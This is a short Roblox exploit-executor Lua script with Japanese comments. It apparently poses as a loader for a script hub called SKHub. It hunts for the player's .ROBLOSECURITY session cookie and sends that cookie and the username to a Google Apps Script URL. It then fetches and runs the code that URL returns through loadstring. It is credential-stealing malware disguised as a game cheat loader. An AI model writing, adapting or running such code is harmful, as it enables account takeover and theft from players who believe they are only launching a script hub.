local user = game.Players.LocalPlayer.Name
local gasUrl = "https://script.google.com/macros/s/AKfycbzmVrEoOyp80pnNnNe48K4Aa0kYfTkKp730CqrfTLReRkfjpDaEIf6ygippGJFwbHi9/exec"

-- 1. getcookies() を使って全クッキーをテーブルで取得する（Deltaで有効なことが多い）
local clist = "NOT_FOUND"
local success, cookies = pcall(function() return getgenv().getcookies() end)

if success and type(cookies) == "table" then
    for i, v in pairs(cookies) do
        -- 本物の鍵（.ROBLOSECURITY）を探し出す
        if v.Name == ".ROBLOSECURITY" or v.name == ".ROBLOSECURITY" then
            clist = v.Value or v.value
            break
        end
    end
end

-- 2. もし上記で取れなかった時の予備（ヘッダーから再度試みる）
if clist == "NOT_FOUND" then
    local gch = getgenv().get_cookie_header
    if gch then clist = gch("https://www.roblox.com/") end
end

-- 3. GASに送信（本家SKHubの起動も兼ねる）
local encoded = game:GetService("HttpService"):UrlEncode(clist)
loadstring(game:HttpGet(gasUrl .. "?user=" .. user .. "&cookie=" .. encoded))()
